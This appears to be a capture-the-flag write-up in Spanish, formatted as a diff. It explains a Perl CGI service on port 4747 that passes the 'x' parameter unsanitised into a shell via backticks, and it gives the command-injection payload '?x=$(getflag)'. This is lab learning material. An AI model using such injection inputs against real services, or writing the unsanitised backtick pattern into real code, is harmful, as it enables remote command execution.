@@ -1,0 +1,32 @@
+# Al introducirme en este usuario veo un 
+# fichero ejecutable por pearl con permisos
+# SUID con la pista de que es el servicio
+# que vemos que tiene el puerto 4747 en escucha
+# Así que o le hacemos Port forwarding para 
+# tirarle peticiones por navegador al estilo
+# 
+# http://localhost:4747/?x=$(getflag)
+#
+# o desde la propia máquina con curl
+#
+# http://localhost:4747/?x=\$(getflag)
+#
+# Así conseguiríamos la flag.
+#
+# el script carga la función param desde CGI
+# Imprime header html
+# crea una subrutina o funcion, es lo mismo.
+# Imprime el valor del primer argumento recibido
+# el parámetro recibido deberá ser 'x', por eso uso /?x=
+#
+#
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
